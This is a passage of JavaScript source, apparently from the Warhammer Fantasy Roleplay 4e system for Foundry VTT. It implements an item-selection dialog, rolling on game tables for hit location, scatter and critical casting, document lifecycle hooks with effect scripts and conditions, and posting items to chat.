class ItemDialog extends Dialog {

    constructor(data)
    {
        super(data);
        this.chosen = 0;
    }

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.resizable = true;
        options.classes.push("item-dialog");
        return options;
    }

    static _items = [];

    static async create(items, count = 1, text)
    {

        if (typeof items == "object" && !Array.isArray(items) && !(items instanceof Collection))
        {
            items = this.objectToArray(items);
        }

        if (count == 0 || items.length == 0)
        {
            return [];
        }

        let html = await renderTemplate("systems/wfrp4e/templates/apps/item-dialog.hbs", {items, count, text});
        return new Promise((resolve) => {
            new ItemDialog({
                title : game.i18n.localize("DIALOG.ItemDialog"),
                content : html,
                system : {items, count, text},
                buttons : {
                    submit : {
                        label : game.i18n.localize("Submit"),
                        callback: (html) => {
                            resolve(Array.from(html.find(".active")).map(element => items[element.dataset.index]));
                        }
                    }                
                }
            }).render(true);
        })
    }

    static async createFromFilters(filters, count, text, items)
    {
        items = await ItemDialog.filterItems(filters, items);
        return new Promise(async (resolve, reject) => {
            let choice = await ItemDialog.create(items, count, text);    
            if (choice.length == 0)
                reject(ui.notifications.error(game.i18n.localize("DIALOG.ErrorMustSelectItem")));
            else 
                resolve(choice);
        })
    }

    
    // simulate document structure with key as the ID and the value as the name
    static objectToArray(object, img = "systems/wfrp4e/icons/blank.png")
    {
        return Object.keys(foundry.utils.deepClone(object)).map(key => 
        {
            return {
                id : key,
                name : object[key],
                img
            };
        });

    }

    async getData() {
        let data = super.getData();
        return data;
    }

    static async filterItems(filters=[], items)
    {
        if (!items)
        {
            items = await this._fetchItems();
        }

        for (let f of filters)
        {
            if (f.regex)
            {
                items = items.filter(i => Array.from(getProperty(i, f.property).matchAll(f.value)).length);
            }
            else 
            {
                let value = f.value;
                if (!Array.isArray(value))
                {
                    value = [value];
                }
                items = items.filter(i => value.includes(getProperty(i, f.property)));
            }
        }

        return items.sort((a, b) => a.name > b.name ? 1 : -1)
    }

    static async _fetchItems()
    {
        // If we've already fetched items, don't fetch again
        // This causes a slight bug in that new items won't be shown without refreshing
        if (this._items.length)
        {
            return this._items;
        }
        
        this._items = game.items.contents;
            
        for (let p of game.packs) {
            if (p.metadata.type == "Item") {
                this._items = this._items.concat((await p.getDocuments()).filter(i => !this._items.find(existing => existing.id == i.id)));
            }
        }
        return this._items;
    }


    activateListeners(html) {
        super.activateListeners(html);
        html.find(".document-name").click(ev => {


            let document = $(ev.currentTarget).parents(".document")[0];
            if (document.classList.contains("active"))
            {
                document.classList.remove("active");
                this.chosen--;
            }
            else if (this.data.system.count == "unlimited" || (this.data.system.count - this.chosen > 0)) {
                document.classList.add("active");
                this.chosen++;
            } 

        });

        html.find(".document-name").contextmenu(ev => {
            let document = $(ev.currentTarget).parents(".document");
            let id = document.attr("data-id");

            game.items.get(id).sheet.render(true, {editable: false});
        });
    }
}

/**
 * This class handles all aspects of custom WFRP tables.
 * 
 * The WFRP_Tables is given table objects on 'init' and 'ready' hooks by
 * both the system, modules, and the world. See the tables folder for 
 * how they're structured. All files in that folder will be
 * added to WFRP_Tables if possible. 
 */


class WFRP_Tables {


  /**
   * The base function to retrieve a result from a table given various parameters.
   * 
   * Options: 
   * `modifier` - modify the roll result by a certain amount
   * `cancelUnderMin` - If true, cancels any rolls that result in a value under the bounds of the table)
   * `lookup` - forego rolling and use this value to lookup the result on the table.
   * 
   * @param {String} table Table name - the filename of the table file
   * @param {Object} options Various options for rolling the table, like modifier
   * @param {String} column Which column to roll on, if possible.
   */
  static async rollTable(tableKey, options = {}, column = null) {
    Hooks.call("wfrp4e:rollTable", {tableKey, options, column});

    let modifier = options.modifier || 0;
    let table = this.findTable(tableKey.toLowerCase(), column);

    if (table) {

      if (table.columns)
        throw new Error(game.i18n.localize("ERROR.Column"))

      let formula = table.formula;

      // If no die specified, just use the table size and roll
      let roll = await new Roll(`${formula} + @modifier`, { modifier }).roll();
      if (options.showRoll)
      {
        let msg = await roll.toMessage({rollMode : game.settings.get("core", "rollMode"), });
        if (game.dice3d)
          await game.dice3d.waitFor3DAnimationByMessageID(msg.id);
      }

      if (game.dice3d && !options.hideDSN && !options.showRoll)
        await game.dice3d.showForRoll(roll);

      let rollValue = options.lookup || roll.total; // options.lookup will ignore the rolled value for the input value
      let displayTotal = options.lookup || roll.result; // Roll value displayed to the user
      if (modifier == 0)
      {
        displayTotal = (0, eval)(displayTotal); // Clean up display value if modifier 0 (59 instead of 59 + 0)
      }
      if (this._isBelowMin(table, rollValue) && !options.cancelUnderMin)
      {
        rollValue = this._minRange(table);
      }

      if (this._isAboveMax(table, rollValue))
      {
        rollValue = this._maxRange(table);
      }

      let rollResult = table.getResultsForRoll(rollValue)[0];
      let flags = rollResult?.flags?.wfrp4e || {};
      let result = {
        result : rollResult?.getChatText(),
        roll : displayTotal,
        total : rollValue,
        object : rollResult?.toObject(),
        title : table.name,
      };



      // If table result text is a UUID link, add a text property with just the label
      result.text = WFRP_Utility.extractLinkLabel(result.result);

      foundry.utils.mergeObject(result, flags);

      if (Object.keys(game.wfrp4e.config.hitLocationTables).includes(tableKey))
        result = this.formatHitloc(rollResult, rollValue);

      return result

    }
    else if (tableKey == "hitloc" || tableKey == "scatter") {

      // Scatter is a special table - calculate distance and return
      if (tableKey == "scatter") {
        let roll = (await new Roll(`1d10`).roll()).total;
        let dist = (await new Roll('2d10').roll()).total;

        return { result: this.scatterResult({roll, dist}), roll }

      }
      else if (tableKey == "hitloc") {
        let roll = await new Roll(`1d100`).roll();
        let result = this._lookup("hitloc", options.lookup || roll.total);
        result.roll = roll.total;
        return result
      }
    }
    else {
      if (tableKey != "menu")
        return ui.notifications.error(game.i18n.format("ERROR.Table", {key : tableKey}))
      else 
        return this.tableMenu()
    }
  }

  // Returns whether or not provided table has a result for the provided value
  static _isCovered(table, value)
  {
    for(let result of table.results.contents)
    {
      if (this._inRange(value, result.range))
      {
        return true;
      }
    }
    return false;
  }

  static _isBelowMin(table, value)
  {
    if (this._isCovered(table, value))
      {
        return false
      }
      
    return value < this._minRange(table, value)
  }

  static _isAboveMax(table, value)
  {
    if (this._isCovered(table, value))
    {
      return false
    }

    return value > this._maxRange(table, value);
  }

  static _maxRange(table)
  {
    return table.results.contents.reduce((max, result) => result.range[0] > max ? result.range[0] : max, Number.MIN_SAFE_INTEGER)
  }

  static _minRange(table)
  {
    return table.results.contents.reduce((min, result) => result.range[0] < min ? result.range[0] : min, Number.MAX_SAFE_INTEGER)
  }

  /**
   * Retrieves a value from a table, using the column if specified
   * 
   * @param {String} table table name
   * @param {Number} value value to lookup
   * @param {String} column column to look under, if needed
   */
  static _lookup(table, value, column = null) {
    if (column && this[table].columns) {
      for (let row of this[table].rows) {
        if (WFRP_Tables._inRange(value, row.range[column]))
          return foundry.utils.duplicate(row)
      }
    }

    else if (column && this[table].multi) {
      for (let row of this[table].rows) {
        if (WFRP_Tables._inRange(value, row.range[column]))
          return foundry.utils.duplicate(row[column])
      }
    }

    else {
      for (let row of this[table].rows) {
        if (WFRP_Tables._inRange(value, row.range))
          return foundry.utils.duplicate(row)
      }
    }
  }

  static _inRange(value, range) {
    if (range.length == 0)
      return false
    if (range.length == 1)
      range.push(range[0]);
    if (value >= range[0] && value <= range[1])
      return true
  }

  /* -------------------------------------------- */

  // critlleg doesn't exist, yet will be asked for because hit location and 'crit' are concatenated
  // Therefore, change specific locations to generalized ones (rarm -> arm)
  static generalizeTable(table) {
    table = table.toLowerCase();
    table = table.replace("lleg", "leg");
    table = table.replace("rleg", "leg");
    table = table.replace("rarm", "arm");
    table = table.replace("larm", "arm");
    return table;
  }

  
  static formatHitloc(result, roll) {
    let flags = result.flags.wfrp4e || {};
    return {
      description : result.getChatText(),
      result : flags.loc,
      roll
    }
  }

  static async rollToChat(table, options = {}, column = null, rollMode) {
    let chatOptions = game.wfrp4e.utility.chatDataSetup("", rollMode, true);
    chatOptions.content = await this.formatChatRoll(table, options, column);
    chatOptions.type = 0;
    if (chatOptions.content)
      ChatMessage.create(chatOptions);
    ui.sidebar.activateTab("chat");
  }

  static findTable(key, column) {
    WFRP_Utility.log(`Finding Table key: ${key} column: ${column}`);
    let tables = game.tables.filter(i => i.getFlag("wfrp4e", "key") == key);
    let table; 

    // Look at table settings first
    let tableSettings = game.settings.get("wfrp4e", "tableSettings");
    WFRP_Utility.log(`Table Settings: `, undefined, tableSettings);

    // If tableSettings has comma separated ids, return them as columns
    let id = tableSettings[`${key}${column ? "-"+column : ""}`]?.split(",");
    if (id && id.length)
    {
      if (id.length > 1)
      {
        tables = id.map(i => game.tables.get(i));
      }
      else // If only one id in table settings, just use that table
      {
        table = game.tables.get(id[0]);
      }
    }

    if (table)
    {
      WFRP_Utility.log("Found Table with settings");
    }

    if (!table)
    {

      WFRP_Utility.log("Table not found with settings, finding first table that matches");

      // If more than one table with that key, and column is specified, return that column
      if (tables.length > 1 && column)
        table = tables.find(i => i.getFlag("wfrp4e", "column") == column);

      // If only one result with that key, or multiple results that don't have a column, return the first one (this condition is needed to return Minor Miscast table if Minor Miscast (Moo) also exists at the same time)
      else if (tables.length == 1 || tables.map(t => t.getFlag("wfrp4e", "column")).filter(t => t).length < 1) 
      {
        table = tables[0];
      }

      // If multiple results, return a special object that has a generalized name and columns array listing the tables 
      else  if (tables.length)
        table =  {name : tables[0].name.split("-")[0].trim(), columns: tables, roll : async () => {
            let table = await ItemDialog.create(tables, 1, game.i18n.localize("CHAT.ColumnPrompt"));
            return await table[0]?.roll();
        }};

      }
    WFRP_Utility.log("Find Table returns", undefined, table);
    return table;

  }

  /**
   * Takes the key of an existing hit location Rollable Table and returns a simple hitloc object.
   * 
   * {
   *  lArm : "Left Arm",
   *  rArm : "Right Arm",
   *  ....
   * }
   * 
   * @param {String} key key of the hit location table
   */
  static getHitLocTable(key)
  {
    let hitloc = {};
    let table = this.findTable(key);

    if (table)
    {
      table.results.forEach(result => {
        if (result.flags.wfrp4e.loc)
          hitloc[result.flags.wfrp4e.loc] = result.text;
      });
    }
    return hitloc
  }


    /**
   * Takes a hitloc key and turns it into a result object
   * 
   * 
   * @param {String} key key of the hit location table
   */
     static hitLocKeyToResult(resultKey, tableKey = "hitloc")
     {
       let table = this.findTable(tableKey);
   
       if (table)
       {
         for(let result of table.results)
         {
           if (result.flags.wfrp4e?.loc == resultKey)
             return this.formatHitloc(result, result.range[0])
         }
       }
     }

  /* -------------------------------------------- */

  /**
   * 
   * Wrapper for rollTable to format rolls from chat commands nicely.
   * 
   * Calls rollTable() and displays the result in a specific format depending
   * on the table rolled on.
   * 
   * @param {String} table Table name - the filename of the table file
   * @param {Object} options Various options for rolling the table, like modifier
   * @param {String} column Which column to roll on, if possible.
   */
  static async formatChatRoll(table, options = {}, column = null) {

    table = this.generalizeTable(table);

    let tableObject = this.findTable(table, column);

    if (tableObject && tableObject.columns)
      return this.promptColumn(table);


    let result = await this.rollTable(table, options, column);
    if (options.lookup && !game.user.isGM) // If the player (not GM) rolled with a lookup value, display it so they can't be cheeky cheaters
      result.roll = game.i18n.localize("TABLE.Lookup") + result.roll;
    try {
      // Cancel the roll if below minimum range
      if (this._isBelowMin(tableObject, result.total) && options.cancelUnderMin)
        return game.i18n.format("TABLE.Cancel", { result: result.roll })
    }
    catch
    { }

    // If the roll is an item, don't post the link to chat, post the item to chat
    if (result.object?.documentCollection && result.object?.documentId)
    {
      let collection = game.packs.get(result.object.documentCollection);

      if (collection)
        await collection.getDocuments();

      if (!collection)
        collection = game.collections.get(result.object.documentCollection);

      if (collection)
      {
        let item = collection.get(result.object.documentId);
        if (item && item.documentName == "Item")
        {
          item.postItem("inf", {"flags.wfrp4e.sourceMessageId" : options.messageId});
          return null
        }
      }

    }

    return result.result

  }

  /**
   * Show the table help menu, display all tables as clickables and hidden tables if requested.
   * 
   * @param {Boolean} showHidden Show hidden tables
   */
  static tableMenu() {
    let tableMenu = `<b><code>/table</code> ${game.i18n.localize("Commands")}</b><br>`;

    let tables = game.tables.filter(i => i.permission);

    let columnsAdded = [];

    // For each table, add a clickable link
    for (let table of tables)
    {
      let key = table.getFlag("wfrp4e", "key");
      let tableObject = this.findTable(key);

      // If the table is a column, add only the general table, and remember the table to not list again for future columns (Only list Weather, not Weather - Spring, Weather - Winter, etc)
      if (tableObject.columns && !columnsAdded.includes(key))
      {
        columnsAdded.push(key);
        tableMenu += `<a data-table='${key}' class='table-click'><i class="fas fa-list"></i> <code>${key}</code></a> - ${tableObject.name}<br>`;
      }
      // If no columns, just list tables
      else if (tableObject && !tableObject.columns)
        tableMenu += `<a data-table='${key}' class='table-click'><i class="fas fa-list"></i> <code>${key}</code></a> - ${table.name}<br>`;
    }
    return {result : tableMenu};
  }

  // When critical casting, there are few options available, one could be a critical wound on a location, so offer a clickable link.
  static criticalCastMenu(crittable) {
    return `${game.i18n.localize("CHAT.ChooseFrom")}:<ul>
      <li><b>${game.i18n.localize("ROLL.CritCast")}</b>: ${game.i18n.localize("CHAT.CritCast")} <a class=table-click data-table=${crittable}><i class="fas fa-list"></i> ${game.i18n.localize("Critical Wound")}</a></li>
      <li><b>${game.i18n.localize("ROLL.TotalPower")}</b>: ${game.i18n.localize("CHAT.TotalPower")}</li>
      <li><b>${game.i18n.localize("ROLL.UnstoppableForce")}</b>: ${game.i18n.localize("CHAT.UnstoppableForce")}</li>
      </ul`;
  }


  // Critical casting without reaching appropriate SL - forced to be Total power in order to get the spell off
  static restrictedCriticalCastMenu() {
    return `${game.i18n.localize("CHAT.MustChoose")}:<ul>
      <li><b>${game.i18n.localize("ROLL.TotalPower")}</b>: ${game.i18n.localize("CHAT.TotalPower")}</li>
      </ul`;
  }

  // Display all columns for a table so the user can click on them and roll them.
  static promptColumn(table) {
    let prompt = `<h3>${game.i18n.localize("CHAT.ColumnPrompt")}</h3>`;

    let tableObject = this.findTable(table);
    for (let c of tableObject.columns)
      prompt += `<div><a class = "table-click" data-table="${table}" data-column = "${c.getFlag("wfrp4e", "column")}"><i class="fas fa-list"></i> ${c.name}</a></div>`;

    return prompt;
  }


  static scatterResult({roll, dist}) {
    let tableHtml = '<table class = "scatter-table">' +
      " <tr>" +
      "<td position='1'> " +
      "</td>" +
      "<td position='2'> " +
      "</td>" +
      "<td position='3'> " +
      "</td>" +
      "</tr>" +
      " <tr>" +
      "<td position='4'> " +
      "</td>" +
      "<td position='10'> " + game.i18n.localize("CHAT.ScatterTarget") +
      "</td>" +
      "<td position='5'> " +
      "</td>" +
      "</tr>" +
      " <tr>" +
      "<td position='6'> " +
      "</td>" +
      "<td position='7'> " +
      "</td>" +
      "<td position='8'> " +
      "</td>" +
      "</tr>" +
      "</table>";

    if (roll == 9)
      tableHtml += game.i18n.localize("CHAT.ScatterYou");
    else if (roll == 10)
      tableHtml += game.i18n.localize("CHAT.ScatterThem");
    else
      tableHtml += game.i18n.localize("CHAT.ScatterNote");
    tableHtml = tableHtml.replace(`position='${roll}'`, "class='selected-position'");
    if (dist && roll <= 8) // Don't roll for 9 or 10
      tableHtml = tableHtml.replace("'selected-position'>", `'selected-position'> ${dist} ${game.i18n.localize("yds")}.`);
    return tableHtml
  }


  static get hitloc() {
    return {
      "name": game.i18n.localize("WFRP4E.LocationsTable"),
      "die": "1d100",
      "rows": [{
        "description": game.i18n.localize("WFRP4E.Locations.head"),
        "result": "head",
        "range": [1, 9]
      }, {
        "description": game.i18n.localize("WFRP4E.Locations.lArm"),
        "result": "lArm",
        "range": [10, 24]
      }, {
        "description": game.i18n.localize("WFRP4E.Locations.rArm"),
        "result": "rArm",
        "range": [25, 44]
      }, {
        "description": game.i18n.localize("WFRP4E.Locations.body"),
        "result": "body",
        "range": [45, 79]
      }, {
        "description": game.i18n.localize("WFRP4E.Locations.lLeg"),
        "result": "lLeg",
        "range": [80, 89]
      }, {
        "description": game.i18n.localize("WFRP4E.Locations.rLeg"),
        "result": "rLeg",
        "range": [90, 100]
      }]
    }
  }


  static get scatter() {
    return {
      name: game.i18n.localize("WFRP4E.ScatterTable"),
      die: "1d10",
      rows: [
        {
          name: game.i18n.localize("WFRP4E.Scatter.TopLeft"),
          range: [1, 1]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.TopMiddle"),
          range: [2, 2]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.TopRight"),
          range: [3, 3]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.CenterLeft"),
          range: [4, 4]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.CenterRight"),
          range: [5, 5]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.BottomLeft"),
          range: [6, 6]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.BottomMiddle"),
          range: [7, 7]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.BottomRight"),
          range: [8, 8]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.AtYourFeet"),
          range: [9, 9]
        },
        {
          name: game.i18n.localize("WFRP4E.Scatter.AtTargetFeet"),
          range: [10, 10]
        },
      ]
    }
  }


}

/**
 * @param {typeof abstract.Document} cls     The base Document class to be mixed
 * @returns {typeof ClientDocument}           The mixed client-side document class definition
 * @category - Mixins
 * @mixin
 */
const WFRP4eDocumentMixin = (cls) => class extends cls {

    // @@@@ _preHook Listeners @@@@
    async _preCreate(data, options, user) {
        if (data._id && !this.isOwned)
            options.keepId = WFRP_Utility._keepID(data._id, this);

        await super._preCreate(data, options, user);
        this.updateSource(await this.system.preCreateData(data, options, user));
    }

    async _preUpdate(data, options, user) {
        await super._preUpdate(data, options, user);
        await this.system.preUpdateChecks(data, options, user);
        await Promise.all(this.runScripts("preUpdate", {data, options, user}));
}

    async _preDelete(options, user) {
        await super._preDelete(options, user);
        await this.system.preDeleteChecks(options, user);
    }

    _preUpdateDescendantDocuments(parent, collection, changes, options, userId) {
        super._preUpdateDescendantDocuments(parent, collection, changes, options, userId);
    }

    _onUpdateDescendantDocuments(parent, collection, documents, changes, options, userId) {
        super._onUpdateDescendantDocuments(parent, collection, documents, changes, options, userId);
    }

    _preDeleteDescendantDocuments(parent, collection, ids, options, userId) {
        super._preDeleteDescendantDocuments(parent, collection, ids, options, userId);
    }


    // @@@@ _onHook Listeners @@@@
    async _onCreate(data, options, user) {
        if (game.user.id != user) {
            return;
        }
        super._onCreate(data, options, user);

        let update = this.system.createChecks(data, options, user);
        if (!foundry.utils.isEmpty(update)) {
            this.update(update);
        }
    }

    async _onUpdate(data, options, user) {
        await super._onUpdate(data, options, user);
        let update = this.system.updateChecks(data, options, user);
        
        if (!foundry.utils.isEmpty(update) && user == game.user.id) {
            await this.update(update);
        }

        if (game.user.id != user) {
            return;
        }
        await Promise.all(this.runScripts("update", {data, options, user}));
    }

    async _onDelete(options, user) {
        super._onDelete(options, user);
        this.system.deleteChecks(options, user);
    }

    _onCreateDescendantDocuments(parent, collection, documents, data, options, userId) {
        super._onCreateDescendantDocuments(parent, collection, documents, data, options, userId);
    }

    _onUpdateDescendantDocuments(parent, collection, documents, changes, options, userId) {
        super._onUpdateDescendantDocuments(parent, collection, documents, changes, options, userId);
    }

    _onDeleteDescendantDocuments(parent, collection, documents, ids, options, userId) {
        super._onDeleteDescendantDocuments(parent, collection, documents, ids, options, userId);
    }

    /**
 * 
 * @param {String} trigger Script trigger to run
 * @param {Object} args Arguments for the script
 * 
 * @returns Array of executed script return values
 */
    runScripts(trigger, args, ownerOnly=false) {

        if (ownerOnly && WFRP_Utility.getActiveDocumentOwner(this).id != game.user.id)
        {
            return [];
        }

        let scripts = this.getScripts(trigger);

        let promises = [];

        for (let script of scripts) {
            if (script.async) {
                promises.push(script.execute(args));
            }
            else {
                script.execute(args);
            }
        }

        return promises;
    }

    /**
* Collect effect scripts being applied to the actor
* 
* @param {String} trigger Specify stript triggers to retrieve
* @param {Function} scriptFilter Optional function to filter out more scripts
* @returns 
*/
    getScripts(trigger, scriptFilter) {
        let effects = Array.from(this.allApplicableEffects()).filter(i => !i.disabled);
        let scripts = effects.reduce((prev, current) => prev.concat(current.scripts.filter(i => i.trigger == trigger)), []);
        if (scriptFilter) {
            scripts = scripts.filter(scriptFilter);
        }
        return scripts;
    }

    //#region Condition Handling
    async addCondition(effect, value = 1) {
        if (typeof (effect) === "string")
            effect = foundry.utils.duplicate(game.wfrp4e.config.statusEffects.find(e => e.id == effect));
        if (!effect)
            return "No Effect Found"

        if (!effect.id)
            return "Conditions require an id field"


        let existing = this.hasCondition(effect.id);

        if (existing && existing.flags.wfrp4e.value == null)
            return existing
        else if (existing) {
            existing = foundry.utils.duplicate(existing);
            existing.flags.wfrp4e.value += value;
            return this.updateEmbeddedDocuments("ActiveEffect", [existing])
        }
        else if (!existing) {
            effect.name = game.i18n.localize(effect.name);
            if (Number.isNumeric(effect.flags.wfrp4e.value))
                effect.flags.wfrp4e.value = value;
            delete effect.id;
            return this.createEmbeddedDocuments("ActiveEffect", [effect], {condition: true});
        }
    }

    async removeCondition(effect, value = 1) {
        if (typeof (effect) === "string")
            effect = foundry.utils.duplicate(game.wfrp4e.config.statusEffects.find(e => e.id == effect));
        if (!effect)
            return "No Effect Found"

        if (!effect.id)
            return "Conditions require an id field"

        let existing = this.hasCondition(effect.id);

        if (existing && existing.flags.wfrp4e.value == null) {
            return this.deleteEmbeddedDocuments("ActiveEffect", [existing._id])
        }
        else if (existing) {
            await existing.setFlag("wfrp4e", "value", existing.conditionValue - value);

            if (existing.flags.wfrp4e.value <= 0)
                return this.deleteEmbeddedDocuments("ActiveEffect", [existing._id])
            else
                return this.updateEmbeddedDocuments("ActiveEffect", [existing])
        }
    }


    hasCondition(conditionKey) {
        let existing = this.effects.find(i => i.conditionId == conditionKey);
        return existing
    }

    
    // Assigns a property to all datamodels are their embedded models
    propagateDataModels(model, name, value)
    {
        if (model instanceof foundry.abstract.DataModel && !model[name])
        {
            Object.defineProperty(model, name, {
                value, 
                enumerable : false
            });
        }

        for(let property in model)
        {
            if (model[property] instanceof foundry.abstract.DataModel)
            {
                this.propagateDataModels(model[property], name, value);
            }
        }
    }

};

/**
 * @extends Item
 * @mixes WFRP4eDocumentMixin
 * @category - Documents
 */
class ItemWfrp4e extends WFRP4eDocumentMixin(Item)
{
  async _preCreate(data, options, user) {
    let migration = game.wfrp4e.migration.migrateItemData(this);
    this.updateSource({effects : game.wfrp4e.migration.removeLoreEffects(data)}, {recursive : false});

    if (!foundry.utils.isEmpty(migration))
    {
      this.updateSource(migration);
      WFRP_Utility.log("Migrating Item: " + this.name, true, migration);
    }

    await super._preCreate(data, options, user);
    if (this.isOwned)
    {
        let allow = await this.system.allowCreation(data, options, user);
        if (!allow)
        {
            return false;
        }
    }

    if (options.fromEffect)
    {
      this.updateSource({"flags.wfrp4e.fromEffect" : options.fromEffect});
    }

    if (this.isOwned)
    {
        await Promise.all(this.actor.runScripts("createItem", this));
        await this._handleConditions(data, options);
    }

    //_preCreate for effects is where immediate scripts run
    // Effects that come with Items aren't called, so handle them here
    await this.handleImmediateScripts(data, options, user);
  }

  async _onCreate(data, options, user)
  {
    if (game.user.id != user)
    {
        return;
    }
    await super._onCreate(data, options, user);

    if (this.isOwned)
    {
      await Promise.all(this.actor.runScripts("update", {data, context: "create"}));

      // Cannot simply call runScripts here because that would only be for Item effects
      // If an item has a transfered effect, it won't call "addItems" scripts because the effect's
      // onCreate method isn't called. Same reason handleImmediate scripts doesn't call runScripts
      let effects = Array.from(this.allApplicableEffects()).filter(effect => effect.applicationData.type == "document" && ["Actor", "Item"].includes(effect.applicationData.documentType));
      for(let effect of effects)
      {
        for(let script of effect.scripts.filter(s => s.trigger == "addItems"))
        {
          await script.execute({data, options, user});
        }
      }
    }

  }

  async _onUpdate(data, options, user)
  {
    await super._onUpdate(data, options, user);
    
    if (game.user.id != user)
    {
        return;
    }
    
    if (foundry.utils.hasProperty(data, "system.worn") || foundry.utils.hasProperty(data, "system.equipped"))
    {
      await Promise.all(this.runScripts("equipToggle", {equipped : this.isEquipped}));
    }

    if (this.actor) {
      await Promise.all(this.actor.runScripts("update", {item : this, context: "update"}));
    }
  }

  async _onDelete(options, user) 
  {
    if (game.user.id != user)
    {
        return;
    }
    await super._onDelete(options, user);

    if (!options.skipDeletingItems)
    {
      for(let effect of this.effects)
      {
        await effect.deleteCreatedItems();
      }
    }

    for(let effect of this.effects)
    {
      for(let script of effect.scripts.filter(i => i.trigger == "deleteEffect"))
      {
          await script.execute({options, user});
      }
    }

    if (this.actor) {
      // TODO change this trigger
      await Promise.all(this.actor.runScripts("update", {item : this, context: "delete"}));
    }
  }

  // Conditions shouldn't be tied to the item. Add them to the actor independently.
  async _handleConditions(data, options)
  {
      if (options.condition)
      {
        return // options.condition as true avoids this process
      }

      let conditions = this.effects.filter(e => e.isCondition);

      // updateSource doesn't seem to work here for some reason: 
      // this.updateSource({effects : []})
      this._source.effects = this.effects.filter(e => !e.isCondition).filter(e => e.toObject());

      this.actor?.createEmbeddedDocuments("ActiveEffect", conditions);
  }

    // This function runs the immediate scripts an Item contains in its effects
    // when the Item is added to an Actor. 
    async handleImmediateScripts(data, options, user)
    {
        let effects = Array.from(this.allApplicableEffects()).filter(effect => 
            effect.applicationData.type == "document" && 
            effect.applicationData.documentType == "Actor"); // We're looking for actor because if the immediate script was for the Item, it would've been called when it was created. 

        for(let e of effects)
        {
            let keepEffect = await e.handleImmediateScripts(data, options, user);
            if (keepEffect == false) // Can't actually delete the effect because it's owned by an item in _preCreate. Change it to `other` type so it doesn't show in the actor
            {
                e.updateSource({"flags.wfrp4e.applicationData.type" : "other"});
            }
        }

        // let scripts = effects.reduce((prev, current) => prev.concat(current.scripts.filter(i => i.trigger == "immediate")), []);

        // await Promise.all(scripts.map(s => s.execute()));
    }



  prepareBaseData()
  {
    this.system.computeBase();
    this.runScripts("prePrepareData", { item: this });
  }

  prepareDerivedData()
  {
    this.system.computeDerived();
    this.runScripts("prepareData", { item: this });
  }

  prepareOwnedData()
  {
    this.actor.runScripts("prePrepareItem", { item: this });
    this.system.computeOwned();
    this.actor.runScripts("prepareItem", { item: this });
    this.runScripts("prepareOwned", { item: this });

  }



  /**
   * Posts this item to chat.
   * 
   * postItem() prepares this item's chat data to post it to chat, setting up 
   * the image if it exists, as well as setting flags so drag+drop works.
   * 
   */
  async postItem(quantity, mergeData={}) {
    const properties = this.system.chatData();
    let postedItem = foundry.utils.mergeObject(this.toObject(), mergeData);
    let chatData = foundry.utils.duplicate(postedItem);
    chatData["properties"] = properties;

    //Check if the posted item should have availability/pay buttons
    chatData.hasPrice = "price" in chatData.system && this.type != "cargo";
    if (chatData.hasPrice) {
      if (!chatData.system.price.gc || isNaN(chatData.system.price.gc || 0))
        chatData.system.price.gc = 0;
      if (!chatData.system.price.ss || isNaN(chatData.system.price.ss || 0))
        chatData.system.price.ss = 0;
      if (!chatData.system.price.bp || isNaN(chatData.system.price.bp))
        chatData.system.price.bp = 0;
    }

    let dialogResult;
    if (quantity == undefined && (this.type == "weapon" || this.type == "armour" || this.type == "ammunition" || this.type == "container" || this.type == "money" || this.type == "trapping")) {
      dialogResult = await new Promise((resolve, reject) => {
        new Dialog({
          content:
            `<p>${game.i18n.localize("DIALOG.EnterQuantity")}</p>
          <div class="form-group">
            <label> ${game.i18n.localize("DIALOG.PostQuantity")}</label>
            <input style="width:100px" name="post-quantity" type="number" value="1"/>
          </div>
          <div class="form-group">
          <label> ${game.i18n.localize("DIALOG.ItemQuantity")}</label>
          <input style="width:100px" name="item-quantity" type="number" value="${this.quantity.value}"/>
        </div>
        <p>${game.i18n.localize("DIALOG.QuantityHint")}</p>
          `,
          title: game.i18n.localize("DIALOG.PostQuantity"),
          buttons: {
            post: {
              label: game.i18n.localize("Post"),
              callback: (dlg) => {
                resolve({
                  post: dlg.find('[name="post-quantity"]').val(),
                  qty: dlg.find('[name="item-quantity"]').val()
                });
              }
            },
            inf: {
              label: game.i18n.localize("Infinite"),
              callback: (dlg) => {
                resolve({ post: "inf", qty: dlg.find('[name="item-quantity"]').val() });
              }
            },
          }
        }).render(true);
      });

      if (dialogResult.post != "inf" && (!Number.isNumeric(dialogResult.post) || parseInt(dialogResult.post) <= 0))
        return ui.notifications.error(game.i18n.localize("CHAT.PostError"))

      if (dialogResult.qty != "inf" && (!Number.isNumeric(dialogResult.qty) || parseInt(dialogResult.qty) < 0))
        return ui.notifications.error(game.i18n.localize("CHAT.PostError"))


      let totalQtyPosted = (dialogResult.post * dialogResult.qty);
      if (Number.isNumeric(totalQtyPosted)) {
        if (this.isOwned) {
          if (this.quantity.value < totalQtyPosted) {
            return ui.notifications.notify(game.i18n.format("CHAT.PostMoreThanHave"))
          }
          else {
            ui.notifications.notify(game.i18n.format("CHAT.PostQuantityReduced", { num: totalQtyPosted }));
            this.update({ "system.quantity.value": this.quantity.value - totalQtyPosted });
          }
        }
      }


      if (dialogResult.post != "inf")
        chatData.showQuantity = true;

      chatData.postQuantity = dialogResult.post;
      postedItem.system.quantity.value = dialogResult.qty;
      chatData.system.quantity.value = dialogResult.qty;
    }
    else if (quantity > 0) {
      chatData.postQuantity = quantity;
      chatData.showQuantity = true;
    }

    // if (dialogResult.post != "inf" && isNaN(dialogResult.post * dialogResult.qty))
    //   return


    // Don't post any image for the item (which would leave a large gap) if the default image is used
    if (chatData.img.includes("/blank.png"))
      chatData.img = null;

    renderTemplate('systems/wfrp4e/templates/chat/post-item.hbs', chatData).then(html => {
      let chatOptions = WFRP_Utility.chatDataSetup(html);

      // Setup drag and drop data
      chatOptions["flags.transfer"] = JSON.stringify(
        {
          type: "postedItem",
          payload: postedItem,
        });
      chatOptions["flags.postQuantity"] = chatData.postQuantity;
      chatOptions["flags.recreationData"] = chatData;
      ChatMessage.create(chatOptions);
    });
  }

  //#endregion
 

  // If item.getScripts is called, filter scripts specifying "Item" document type
